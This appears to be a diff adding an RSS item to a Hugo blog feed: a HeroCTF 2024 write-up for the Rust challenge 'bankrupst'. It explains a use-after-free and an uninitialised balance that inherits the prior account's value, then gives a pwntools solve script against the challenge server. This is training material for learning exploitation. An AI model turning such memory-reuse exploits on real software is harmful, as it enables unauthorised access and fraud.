@@ -6,8 +6,238 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Fri, 27 Oct 2028 00:00:00 +0000</lastBuildDate>
+        <lastBuildDate>Sun, 27 Oct 2024 00:00:00 +0000</lastBuildDate>
         <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>🇬🇧 HeroCTF 2024 - pwn/bankrupst</title>
+            <link>/posts/2024/10/heroctf-2024-pwn/bankrupst/</link>
+            <pubDate>Sun, 27 Oct 2024 00:00:00 +0000</pubDate>
+            
+            <guid>/posts/2024/10/heroctf-2024-pwn/bankrupst/</guid>
+            <description>&lt;h3 id=&#34;table-of-contents&#34;&gt;Table of contents&lt;/h3&gt;
+&lt;hr&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;/posts/2024/10/heroctf-2024-pwn/bankrupst/#file-information&#34;&gt;File Information&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;/posts/2024/10/heroctf-2024-pwn/bankrupst/#looking-for-a-vulnerability&#34;&gt;Looking for a vulnerability&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;/posts/2024/10/heroctf-2024-pwn/bankrupst/#exploit-plan-tldr&#34;&gt;Exploit Plan (TLDR)&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;/posts/2024/10/heroctf-2024-pwn/bankrupst/#solve-script&#34;&gt;Solve Script&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;/posts/2024/10/heroctf-2024-pwn/bankrupst/#conclusion&#34;&gt;Conclusion&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;note&#34;&gt;Note&lt;/h2&gt;
+&lt;p&gt;Writeup for the first &lt;code&gt;pwn&lt;/code&gt; challenge from HeroCTF 2024.&lt;/p&gt;
+&lt;h2 id=&#34;description&#34;&gt;Description&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;BankRupst is a bank operating in bankruptcy where no laws are applicable.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;file-information&#34;&gt;File information&lt;/h2&gt;
+&lt;p&gt;We&amp;rsquo;re given the binary and the source code which is written in Rust.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-css&#34; data-lang=&#34;css&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;checksec&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;bankrupst&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;file&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;bankrupst&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[*]&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/conflict/ctfs/heroctf2024/pwn/pwn_bankrupst/bankrupst&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;Arch&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;       &lt;span style=&#34;color:#f92672&#34;&gt;amd64-64-little&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;RELRO&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;Full&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;RELRO&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;Stack&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;No&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;canary&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;found&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;NX&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;         &lt;span style=&#34;color:#f92672&#34;&gt;NX&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;enabled&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;PIE&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;PIE&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;enabled&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;Stripped&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;No&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;bankrupst&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;ELF&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;64-bit&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;LSB&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;pie&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;executable&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;x86-64&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;version&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;SYSV&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;static-pie&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;linked&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;BuildID&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;sha1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;fcaba4040b2539cfd3c26241d864d3e46727ca82&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;stripped&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Reading the source code, we can see that every function has the &lt;em&gt;unsafe&lt;/em&gt; keyword. It is used to bypass Rust’s safety checks and allows greater &amp;ldquo;control&amp;rdquo; over memory, but it can also make your program vulnerable if memory is not managed properly.&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<h3 id="table-of-contents">Table of contents</h3>
+<hr>
+<ul>
+<li>
+<p><a href="/posts/2024/10/heroctf-2024-pwn/bankrupst/#file-information">File Information</a></p>
+</li>
+<li>
+<p><a href="/posts/2024/10/heroctf-2024-pwn/bankrupst/#looking-for-a-vulnerability">Looking for a vulnerability</a></p>
+</li>
+<li>
+<p><a href="/posts/2024/10/heroctf-2024-pwn/bankrupst/#exploit-plan-tldr">Exploit Plan (TLDR)</a></p>
+</li>
+<li>
+<p><a href="/posts/2024/10/heroctf-2024-pwn/bankrupst/#solve-script">Solve Script</a></p>
+</li>
+<li>
+<p><a href="/posts/2024/10/heroctf-2024-pwn/bankrupst/#conclusion">Conclusion</a></p>
+</li>
+</ul>
+<hr>
+<h2 id="note">Note</h2>
+<p>Writeup for the first <code>pwn</code> challenge from HeroCTF 2024.</p>
+<h2 id="description">Description</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>BankRupst is a bank operating in bankruptcy where no laws are applicable.
+</span></span></code></pre></div><h2 id="file-information">File information</h2>
+<p>We&rsquo;re given the binary and the source code which is written in Rust.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">checksec</span> <span style="color:#f92672">bankrupst</span><span style="color:#f92672">;</span> <span style="color:#f92672">file</span> <span style="color:#f92672">bankrupst</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[*]</span> <span style="color:#e6db74">&#39;/home/conflict/ctfs/heroctf2024/pwn/pwn_bankrupst/bankrupst&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Arch</span><span style="color:#f92672">:</span>       <span style="color:#f92672">amd64-64-little</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RELRO</span><span style="color:#f92672">:</span>      <span style="color:#f92672">Full</span> <span style="color:#f92672">RELRO</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stack</span><span style="color:#f92672">:</span>      <span style="color:#f92672">No</span> <span style="color:#f92672">canary</span> <span style="color:#f92672">found</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">NX</span><span style="color:#f92672">:</span>         <span style="color:#f92672">NX</span> <span style="color:#f92672">enabled</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>        <span style="color:#f92672">PIE</span> <span style="color:#f92672">enabled</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stripped</span><span style="color:#f92672">:</span>   <span style="color:#f92672">No</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">bankrupst</span><span style="color:#f92672">:</span> <span style="color:#f92672">ELF</span> <span style="color:#f92672">64-bit</span> <span style="color:#f92672">LSB</span> <span style="color:#f92672">pie</span> <span style="color:#f92672">executable</span><span style="color:#f92672">,</span> <span style="color:#f92672">x86-64</span><span style="color:#f92672">,</span> <span style="color:#f92672">version</span> <span style="color:#f92672">1</span> <span style="color:#f92672">(</span><span style="color:#f92672">SYSV</span><span style="color:#f92672">),</span> <span style="color:#f92672">static-pie</span> <span style="color:#f92672">linked</span><span style="color:#f92672">,</span> <span style="color:#f92672">BuildID</span><span style="color:#f92672">[</span><span style="color:#f92672">sha1</span><span style="color:#f92672">]=</span><span style="color:#f92672">fcaba4040b2539cfd3c26241d864d3e46727ca82</span><span style="color:#f92672">,</span> <span style="color:#f92672">not</span> <span style="color:#f92672">stripped</span>
+</span></span></code></pre></div><p>Reading the source code, we can see that every function has the <em>unsafe</em> keyword. It is used to bypass Rust’s safety checks and allows greater &ldquo;control&rdquo; over memory, but it can also make your program vulnerable if memory is not managed properly.</p>
+<p>The program simulates a simple bank account manager: you can insert &amp; remove your card, deposit &amp; withdraw money, and check your balance.</p>
+<h2 id="looking-for-a-vulnerability">Looking for a vulnerability</h2>
+<p>We can see that option 4 is our <code>win</code> function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span><span style="color:#ae81ff">4</span> <span style="color:#f92672">=&gt;</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> opened {
+</span></span><span style="display:flex;"><span>        println!(<span style="color:#e6db74">&#34;Account balance: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#f92672">*</span>account).balance);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>account).balance <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1337</span> {
+</span></span><span style="display:flex;"><span>            println!(<span style="color:#e6db74">&#34;Congrats! You are now a special member!&#34;</span>);
+</span></span><span style="display:flex;"><span>	        <span style="color:#66d9ef">let</span> flag_file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;flag.txt&#34;</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">match</span> fs::read_to_string(flag_file) {
+</span></span><span style="display:flex;"><span>                Ok(flag) <span style="color:#f92672">=&gt;</span> println!(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span>, flag),
+</span></span><span style="display:flex;"><span>                Err(e) <span style="color:#f92672">=&gt;</span> eprintln!(<span style="color:#e6db74">&#34;Error reading flag.txt: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span>, e),
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        println!(<span style="color:#e6db74">&#34;Enter your BankRupst card!&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>If our account’s balance is greater than <em>$1337</em>, the program will output the flag, so now we know our goal. We need to figure out how to achieve it.</p>
+<p>Let&rsquo;s start by taking a look at the <code>deposit</code> function.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span><span style="color:#66d9ef">unsafe</span> <span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">deposit</span>(account: <span style="color:#f92672">*</span><span style="color:#66d9ef">mut</span> BankAccount) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>account).deposits <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">13</span> {
+</span></span><span style="display:flex;"><span>            println!(<span style="color:#e6db74">&#34;Deposit limit reached this month.&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        print!(<span style="color:#e6db74">&#34;How much do you want to deposit? &#34;</span>);
+</span></span><span style="display:flex;"><span>        io::stdout().flush().unwrap();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#66d9ef">mut</span> amount_input <span style="color:#f92672">=</span> String::new();
+</span></span><span style="display:flex;"><span>        io::stdin().read_line(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> amount_input).unwrap();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> amount: <span style="color:#66d9ef">i32</span> <span style="color:#f92672">=</span> amount_input.trim().parse().unwrap();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> amount <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> amount <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">100</span> {
+</span></span><span style="display:flex;"><span>            println!(<span style="color:#e6db74">&#34;You cannot exceed 100 per deposit.&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            (<span style="color:#f92672">*</span>account).balance <span style="color:#f92672">+=</span> amount;
+</span></span><span style="display:flex;"><span>            (<span style="color:#f92672">*</span>account).deposits <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>There are two important things:</p>
+<ul>
+<li>Only 13 deposits are allowed.</li>
+<li>The maximum deposit amount is <em>$100</em>.</li>
+</ul>
+<p><em>Obviously,</em> we cannot deposit <em>$1338</em> to the account; the maximum is going to be <em>$1300</em>.</p>
+<p>Let&rsquo;s try to find a way to work around this limit. We can notice a difference in how the <code>BankAccount</code> struct is dropped between options 5 and 6:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span><span style="color:#ae81ff">5</span> <span style="color:#f92672">=&gt;</span> {
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> opened {
+</span></span><span style="display:flex;"><span>                        (<span style="color:#f92672">*</span>account).balance<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>                        (<span style="color:#f92672">*</span>account).deposits <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>                        ptr::drop_in_place(account);
+</span></span><span style="display:flex;"><span>                        opened <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>                        println!(<span style="color:#e6db74">&#34;BankRupst card removed.&#34;</span>);
+</span></span><span style="display:flex;"><span>                    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                        println!(<span style="color:#e6db74">&#34;You must insert your BankRupst card!&#34;</span>);
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">6</span> <span style="color:#f92672">=&gt;</span> {
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> opened {
+</span></span><span style="display:flex;"><span>                        (<span style="color:#f92672">*</span>account).balance<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>                        (<span style="color:#f92672">*</span>account).deposits <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">let</span> layout <span style="color:#f92672">=</span> Layout::new::<span style="color:#f92672">&lt;</span>BankAccount<span style="color:#f92672">&gt;</span>();
+</span></span><span style="display:flex;"><span>                        dealloc(account <span style="color:#66d9ef">as</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">mut</span> <span style="color:#66d9ef">u8</span>, layout);
+</span></span><span style="display:flex;"><span>                        account <span style="color:#f92672">=</span> ptr::null_mut();
+</span></span><span style="display:flex;"><span>                        opened <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>                        println!(<span style="color:#e6db74">&#34;Thank you for using BankRupst!&#34;</span>);
+</span></span></code></pre></div><p>In option 6, the memory chunk is deallocated, and the pointer is nulled.
+In option 5, this is not the case. The <code>drop_in_place</code> function only destroys the struct, but the memory chunk is not deallocated.</p>
+<p>This means that if we remove our card and insert it again, our new <code>BankAccount</code> struct will occupy the previous account&rsquo;s memory chunk.</p>
+<p>Let&rsquo;s take a look at how a <code>BankAccount</code> is created:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">BankAccount</span> {
+</span></span><span style="display:flex;"><span>    balance: <span style="color:#66d9ef">i32</span>,
+</span></span><span style="display:flex;"><span>    deposits: <span style="color:#66d9ef">u32</span>,
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">impl</span> BankAccount {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsafe</span> <span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">new</span>() -&gt; <span style="color:#f92672">*</span><span style="color:#66d9ef">mut</span> BankAccount {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> layout <span style="color:#f92672">=</span> Layout::new::<span style="color:#f92672">&lt;</span>BankAccount<span style="color:#f92672">&gt;</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> ptr <span style="color:#f92672">=</span> alloc(layout) <span style="color:#66d9ef">as</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">mut</span> BankAccount;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ptr.is_null() {
+</span></span><span style="display:flex;"><span>            panic!(<span style="color:#e6db74">&#34;Memory allocation failed!&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        (<span style="color:#f92672">*</span>ptr).deposits <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        ptr 
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>As you can see, <code>deposits</code> is set to <code>0</code>, but not the balance. This means that our newly created <code>BankAccount</code> will inherit the previous account’s <code>balance</code>.</p>
+<h2 id="exploit-plan-tldr">Exploit Plan (TLDR)</h2>
+<ol>
+<li>Insert the card (make an account).</li>
+<li>Make 13 deposits of <em>$100</em> each.</li>
+<li>Remove the card (drop the struct).</li>
+<li>Insert the card again (reuse the memory chunk).</li>
+<li>(Deposit <em>$100</em>).</li>
+<li>Check the balance.</li>
+</ol>
+<p>⚠️ Normally, we would need to deposit money again after reinserting the card, but for some reason (probably due to remaining values in the chunk), the balance already exceeds <em>$1337</em>, so there&rsquo;s no need to do that.</p>
+<h2 id="solve-script">Solve Script</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>update(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;x86_64&#39;</span>)
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./bankrupst&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>REMOTE:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;pwn.heroctf.fr&#34;</span>, <span style="color:#ae81ff">6001</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./bankrupst&#34;</span>)
+</span></span><span style="display:flex;"><span>        gdb<span style="color:#f92672">.</span>attach(r)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> start()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># =============================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># =-=-=- Un jour je serai le meilleur pwner -=-=-=</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># =============================================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Insert card</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;option: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Fill the account to get the amount to 1300</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">13</span>):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;option: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;deposit? &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;100&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Remove the card to drop the struct</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;option: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;5&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Reinsert the card to make a new struct over it</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;option: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Flag !</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;option: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print((<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Flag -&gt; Hero&#34;</span> <span style="color:#f92672">+</span> io<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Hero&#39;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#ae81ff">0</span>])<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
+</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
+<p>Nice challenge exploiting a <em>logic bug</em> and a <em>use-after-free</em>.</p>
+<p><a href="/posts/2024/10/heroctf-2024-pwn/bankrupst/#top">back to top</a></p>
+]]></content>
+        </item>
         
         <item>
             <title>🇫🇷 PwnMe 2023 - pwn/vip_at_libc</title>
